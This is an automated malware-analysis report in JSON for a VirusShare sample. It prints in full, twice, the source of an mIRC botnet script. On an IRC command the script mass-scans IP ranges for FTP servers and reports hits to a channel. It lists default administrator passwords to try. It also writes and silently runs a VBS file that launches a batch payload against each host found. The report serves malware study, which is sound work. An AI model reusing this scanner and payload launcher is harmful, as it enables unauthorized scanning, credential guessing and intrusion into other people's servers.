{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "CreateObject": "May create an OLE object",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "Wscript.shell": "May run an executable file or a system command",
            "chr": "May attempt to obfuscate specific str",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "windows": "May enumerate application windows",
            "write": "May write to a file"
        },
        "macro": "on 10:text:!ftproot *:*:{\n  set %chan $chan\n  if ($2 == stop) {\n    timerFTPServerScan* Off\n    sockclose FTPServerScan*\n    msg %chan FTP Scan Stopped\n    halt\n  }\n  if ($2 == status) {\n    if ($timer(FTPServerScan0) == $null) {\n      ;msg %chan FTP Script Unactive\n      halt\n    }\n    if ($timer(FTPServerScan0) != $null) {\n      if ($lines(ntserver.vxd) == $null) {\n        if (%ftpskill == $null) { set %ftpskill 0 }\n        msg %chan FTP Scan (Range) $longip(%FTPServerScanStartIp) -> $longip(%FTPServerScanEndIp) (Current) $longip(%FTPServerScanCurrentIp) (Sockets Open) $sock(FTPServerScan*,*) (Found) %ftpskill\n        halt\n      }\n    }\n  }\n  if ($2 == resume) {\n    if (%FTPServerScanStartIp == $null) {\n      msg %chan FTP Scan (Error) Cannot Resume\n      halt\n    }\n    if (%FTPServerScanCurrentIp == $null) {\n      msg %chan FTP Scan (Error) Cannot Resume\n      halt\n    }\n    if (%FTPServerScanEndIp == $null) {\n      msg %chan FTP Scan (Error) Cannot Resume\n      halt\n    }\n    if (%FTPServerScanCurrentIp == %FTPServerScanEndIp) {\n      msg %chan FTP Scan (Error) Scan Complete\n      halt\n    }\n    msg %chan FTP Scan in Progress (Range) $longip(%FTPServerScanCurrentIP) -> $longip(%FTPServerScanEndIP)\n    timerFTPServerScan0 -o 0 5 FTPServerScan\n    timerFTPServerScan1 -o 0 5 FTPServerScan\n    timerFTPServerScan2 -o 0 5 FTPServerScan\n    timerFTPServerScan3 -o 0 5 FTPServerScan\n    timerFTPServerScan4 -o 0 5 FTPServerScan\n    timerFTPServerScan5 -o 0 5 FTPServerScan\n    timerFTPServerScan6 -o 0 5 FTPServerScan\n    timerFTPServerScan7 -o 0 5 FTPServerScan\n    timerFTPServerScan8 -o 0 5 FTPServerScan\n    timerFTPServerScan9 -o 0 5 FTPServerScan\n    timerFTPServerScan10 -o 0 5 FTPServerScan\n    timerFTPServerScan11 -o 0 5 FTPServerScan\n    timerFTPServerScan12 -o 0 5 FTPServerScan\n  }\n  if ($2 == start) && ($3 == random) {\n    unset %ftpskill\n    set %ip $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) \n    set %FTPServerScanStartIp %ip $+ .1\n    set %FTPServerScanCurrentIp %ip $+ .1\n    set %FTPServerScanEndIp %ip $+ .255\n    timerFTPServerScan0 -o 0 5 FTPServerScan\n    timerFTPServerScan1 -o 0 5 FTPServerScan\n    timerFTPServerScan2 -o 0 5 FTPServerScan\n    timerFTPServerScan3 -o 0 5 FTPServerScan\n    timerFTPServerScan4 -o 0 5 FTPServerScan\n    timerFTPServerScan5 -o 0 5 FTPServerScan\n    timerFTPServerScan6 -o 0 5 FTPServerScan\n    timerFTPServerScan7 -o 0 5 FTPServerScan\n    timerFTPServerScan8 -o 0 5 FTPServerScan\n    timerFTPServerScan9 -o 0 5 FTPServerScan\n    timerFTPServerScan10 -o 0 5 FTPServerScan\n    timerFTPServerScan11 -o 0 5 FTPServerScan\n    timerFTPServerScan12 -o 0 5 FTPServerScan\n    set %FTPServerScanStartIp $longip(%FTPServerScanStartIp)\n    set %FTPServerScanCurrentIp $longip(%FTPServerScanCurrentIp)\n    set %FTPServerScanEndIp $longip(%FTPServerScanEndIp)\n    msg %chan FTP Scan in Progress (Range) $longip(%FTPServerScanStartIp) -> $longip(%FTPServerScanEndIp)\n  }\n  if ($2 == start) && ($me == $5) {\n    unset %ftpskill\n    set %FTPServerScanStartIp $3\n    set %FTPServerScanCurrentIp $3\n    set %FTPServerScanEndIp $4\n    timerFTPServerScan0 -o 0 5 FTPServerScan\n    timerFTPServerScan1 -o 0 5 FTPServerScan\n    timerFTPServerScan2 -o 0 5 FTPServerScan\n    timerFTPServerScan3 -o 0 5 FTPServerScan\n    timerFTPServerScan4 -o 0 5 FTPServerScan\n    timerFTPServerScan5 -o 0 5 FTPServerScan\n    timerFTPServerScan6 -o 0 5 FTPServerScan\n    timerFTPServerScan7 -o 0 5 FTPServerScan\n    timerFTPServerScan8 -o 0 5 FTPServerScan\n    timerFTPServerScan9 -o 0 5 FTPServerScan\n    timerFTPServerScan10 -o 0 5 FTPServerScan\n    timerFTPServerScan11 -o 0 5 FTPServerScan\n    timerFTPServerScan12 -o 0 5 FTPServerScan\n    msg %chan FTP Scan in Progress (Range) $longip($3) -> $longip($4)\n  }\n}\nalias FTPServerScan {\n  if (%FTPServerScanCurrentIP == %FTPServerScanEndIp) {\n    msg %chan FTP Scan Complete (Range) $longip(%FTPServerScanStartIp) -> $longip(%FTPServerScanEndIp)\n    //hop %chan All done with $longip(%FTPServerScanStartIp) -> $longip(%FTPServerScanEndIp)\n    sockclose FTPServerScan*\n    timerFTPServerScan* Off\n    halt\n  }\n  if (%FTPServerScanCurrentIP != %FTPServerScanEndIp) {\n    inc %FTPServerScanCurrentIp 1\n    sockopen FTPServerScan $+ %FTPServerScanCurrentIp $longip(%FTPServerScanCurrentIp) 21\n    halt\n  }\n}\non *:sockopen:FTPServerScan*:{\n  if ($sockerr) {\n    sockclose $sockname\n    halt\n  }\n  else {\n    inc %ftpskill\n    msg %chan FTP Found on $sock($sockname).ip (Amount %ftpskill $+ )\n    //sockwrite $sockname USER administrator\n    //sockwrite $sockname PASS Administrator\n    //sockwrite $sockname PASS $chr(32)\n    //sockwrite $sockname PASS admin\n    //sockwrite $sockname USER administrator\n    //sockwrite $sockname PASS 123\n    //sockwrite $sockname PASS 1234\n    //sockwrite $sockname PASS 12345\n    //sockwrite $sockname USER administrator\n    //sockwrite $sockname PASS 123456\n    //sockwrite $sockname PASS 1234567\n    //sockwrite $sockname PASS 12345678\n    //sockwrite $sockname USER administrator\n    //sockwrite $sockname PASS 123456789\n    //sockwrite $sockname PASS 123456789\n    //sockwrite $sockname PASS 123456789\n    //sockwrite $sockname USER administrator\n    //sockwrite $sockname USER administrator\n    //sockwrite $sockname USER administrator\n    //sockwrite $sockname USER administrator\n    //sockwrite $sockname USER administrator\n\n    write root $+ $sock($sockname).ip $+ .vbs on error resume next\n    write root $+ $sock($sockname).ip $+ .vbs Set fso = CreateObject(\"Scripting.FileSystemObject\")\n    write root $+ $sock($sockname).ip $+ .vbs windows = fso.GetSpecialFolder(WindowsFolder)\n    write root $+ $sock($sockname).ip $+ .vbs Set src3 = CreateObject(\"Wscript.shell\")\n    write root $+ $sock($sockname).ip $+ .vbs src3.run \"system32.bat $sock($sockname).ip $+ \",0,true\n    timer 1 650 remove root $+ $sock($sockname).ip $+ .vbs\n    run root $+ $sock($sockname).ip $+ .vbs\n    sockclose $sockname\n  }\n}"
    },
    "filename": "VirusShare_138bce9396dac16d0399ed0302141fa1",
    "filesize": 6091,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "138bce9396dac16d0399ed0302141fa1",
        "sha1": "17e9f42f33465d11501a55842db266eee1675a35",
        "sha256": "cae74680973a3e36c5b55f9b9917da93c7693df8d60cef6ab8207957ff815501"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "on 10:text:!ftproot *:*:{",
            "  set %chan $chan",
            "  if ($2 == stop) {",
            "    timerFTPServerScan* Off",
            "    sockclose FTPServerScan*",
            "    msg %chan FTP Scan Stopped",
            "    halt",
            "  if ($2 == status) {",
            "    if ($timer(FTPServerScan0) == $null) {",
            "      ;msg %chan FTP Script Unactive",
            "      halt",
            "    }",
            "    if ($timer(FTPServerScan0) != $null) {",
            "      if ($lines(ntserver.vxd) == $null) {",
            "        if (%ftpskill == $null) { set %ftpskill 0 }",
            "        msg %chan FTP Scan (Range) $longip(%FTPServerScanStartIp) -> $longip(%FTPServerScanEndIp) (Current) $longip(%FTPServerScanCurrentIp) (Sockets Open) $sock(FTPServerScan*,*) (Found) %ftpskill",
            "        halt",
            "      }",
            "    }",
            "  if ($2 == resume) {",
            "    if (%FTPServerScanStartIp == $null) {",
            "      msg %chan FTP Scan (Error) Cannot Resume",
            "      halt",
            "    }",
            "    if (%FTPServerScanCurrentIp == $null) {",
            "      msg %chan FTP Scan (Error) Cannot Resume",
            "      halt",
            "    }",
            "    if (%FTPServerScanEndIp == $null) {",
            "      msg %chan FTP Scan (Error) Cannot Resume",
            "      halt",
            "    }",
            "    if (%FTPServerScanCurrentIp == %FTPServerScanEndIp) {",
            "      msg %chan FTP Scan (Error) Scan Complete",
            "      halt",
            "    }",
            "    msg %chan FTP Scan in Progress (Range) $longip(%FTPServerScanCurrentIP) -> $longip(%FTPServerScanEndIP)",
            "    timerFTPServerScan0 -o 0 5 FTPServerScan",
            "    timerFTPServerScan1 -o 0 5 FTPServerScan",
            "    timerFTPServerScan2 -o 0 5 FTPServerScan",
            "    timerFTPServerScan3 -o 0 5 FTPServerScan",
            "    timerFTPServerScan4 -o 0 5 FTPServerScan",
            "    timerFTPServerScan5 -o 0 5 FTPServerScan",
            "    timerFTPServerScan6 -o 0 5 FTPServerScan",
            "    timerFTPServerScan7 -o 0 5 FTPServerScan",
            "    timerFTPServerScan8 -o 0 5 FTPServerScan",
            "    timerFTPServerScan9 -o 0 5 FTPServerScan",
            "    timerFTPServerScan10 -o 0 5 FTPServerScan",
            "    timerFTPServerScan11 -o 0 5 FTPServerScan",
            "    timerFTPServerScan12 -o 0 5 FTPServerScan",
            "  if ($2 == start) && ($3 == random) {",
            "    unset %ftpskill",
            "    set %ip $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) ",
            "    set %FTPServerScanStartIp %ip $+ .1",
            "    set %FTPServerScanCurrentIp %ip $+ .1",
            "    set %FTPServerScanEndIp %ip $+ .255",
            "    timerFTPServerScan0 -o 0 5 FTPServerScan",
            "    timerFTPServerScan1 -o 0 5 FTPServerScan",
            "    timerFTPServerScan2 -o 0 5 FTPServerScan",
            "    timerFTPServerScan3 -o 0 5 FTPServerScan",
            "    timerFTPServerScan4 -o 0 5 FTPServerScan",
            "    timerFTPServerScan5 -o 0 5 FTPServerScan",
            "    timerFTPServerScan6 -o 0 5 FTPServerScan",
            "    timerFTPServerScan7 -o 0 5 FTPServerScan",
            "    timerFTPServerScan8 -o 0 5 FTPServerScan",
            "    timerFTPServerScan9 -o 0 5 FTPServerScan",
            "    timerFTPServerScan10 -o 0 5 FTPServerScan",
            "    timerFTPServerScan11 -o 0 5 FTPServerScan",
            "    timerFTPServerScan12 -o 0 5 FTPServerScan",
            "    set %FTPServerScanStartIp $longip(%FTPServerScanStartIp)",
            "    set %FTPServerScanCurrentIp $longip(%FTPServerScanCurrentIp)",
            "    set %FTPServerScanEndIp $longip(%FTPServerScanEndIp)",
            "    msg %chan FTP Scan in Progress (Range) $longip(%FTPServerScanStartIp) -> $longip(%FTPServerScanEndIp)",
            "  if ($2 == start) && ($me == $5) {",
            "    unset %ftpskill",
            "    set %FTPServerScanStartIp $3",
            "    set %FTPServerScanCurrentIp $3",
            "    set %FTPServerScanEndIp $4",
            "    timerFTPServerScan0 -o 0 5 FTPServerScan",
            "    timerFTPServerScan1 -o 0 5 FTPServerScan",
            "    timerFTPServerScan2 -o 0 5 FTPServerScan",
            "    timerFTPServerScan3 -o 0 5 FTPServerScan",
            "    timerFTPServerScan4 -o 0 5 FTPServerScan",
            "    timerFTPServerScan5 -o 0 5 FTPServerScan",
            "    timerFTPServerScan6 -o 0 5 FTPServerScan",
            "    timerFTPServerScan7 -o 0 5 FTPServerScan",
            "    timerFTPServerScan8 -o 0 5 FTPServerScan",
            "    timerFTPServerScan9 -o 0 5 FTPServerScan",
            "    timerFTPServerScan10 -o 0 5 FTPServerScan",
            "    timerFTPServerScan11 -o 0 5 FTPServerScan",
            "    timerFTPServerScan12 -o 0 5 FTPServerScan",
            "    msg %chan FTP Scan in Progress (Range) $longip($3) -> $longip($4)",
            "alias FTPServerScan {",
            "  if (%FTPServerScanCurrentIP == %FTPServerScanEndIp) {",
            "    msg %chan FTP Scan Complete (Range) $longip(%FTPServerScanStartIp) -> $longip(%FTPServerScanEndIp)",
            "    //hop %chan All done with $longip(%FTPServerScanStartIp) -> $longip(%FTPServerScanEndIp)",
            "    sockclose FTPServerScan*",
            "    timerFTPServerScan* Off",
            "    halt",
            "  if (%FTPServerScanCurrentIP != %FTPServerScanEndIp) {",
            "    inc %FTPServerScanCurrentIp 1",
            "    sockopen FTPServerScan $+ %FTPServerScanCurrentIp $longip(%FTPServerScanCurrentIp) 21",
            "    halt",
            "on *:sockopen:FTPServerScan*:{",
            "  if ($sockerr) {",
            "    sockclose $sockname",
            "    halt",
            "  else {",
            "    inc %ftpskill",
            "    msg %chan FTP Found on $sock($sockname).ip (Amount %ftpskill $+ )",
            "    //sockwrite $sockname USER administrator",
            "    //sockwrite $sockname PASS Administrator",
            "    //sockwrite $sockname PASS $chr(32)",
            "    //sockwrite $sockname PASS admin",
            "    //sockwrite $sockname USER administrator",
            "    //sockwrite $sockname PASS 123",
            "    //sockwrite $sockname PASS 1234",
            "    //sockwrite $sockname PASS 12345",
            "    //sockwrite $sockname USER administrator",
            "    //sockwrite $sockname PASS 123456",
            "    //sockwrite $sockname PASS 1234567",
            "    //sockwrite $sockname PASS 12345678",
            "    //sockwrite $sockname USER administrator",
            "    //sockwrite $sockname PASS 123456789",
            "    //sockwrite $sockname PASS 123456789",
            "    //sockwrite $sockname PASS 123456789",
            "    //sockwrite $sockname USER administrator",
            "    //sockwrite $sockname USER administrator",
            "    //sockwrite $sockname USER administrator",
            "    //sockwrite $sockname USER administrator",
            "    //sockwrite $sockname USER administrator",
            "    write root $+ $sock($sockname).ip $+ .vbs on error resume next",
            "    write root $+ $sock($sockname).ip $+ .vbs Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "    write root $+ $sock($sockname).ip $+ .vbs windows = fso.GetSpecialFolder(WindowsFolder)",
            "    write root $+ $sock($sockname).ip $+ .vbs Set src3 = CreateObject(\"Wscript.shell\")",
            "    write root $+ $sock($sockname).ip $+ .vbs src3.run \"system32.bat $sock($sockname).ip $+ \",0,true",
            "    timer 1 650 remove root $+ $sock($sockname).ip $+ .vbs",
            "    run root $+ $sock($sockname).ip $+ .vbs",
            "    sockclose $sockname"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.390873",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
